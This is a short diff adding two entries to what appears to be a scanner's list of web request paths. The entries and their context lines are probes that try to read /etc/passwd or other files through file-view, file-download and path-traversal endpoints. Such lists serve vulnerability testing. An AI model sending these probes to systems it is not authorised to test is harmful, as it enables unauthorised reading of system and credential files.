@@ -733,3 +733,5 @@
 /api/fs/read?allowOutsideWorkspace=true&path=/etc/passwd
 /api/v1/repos/search?limit=1
 /cache/original/%2e%2e/composer.json
+/api/system/fileView?file=/etc/passwd
+/api/system/fileDownload?file=/etc/passwd
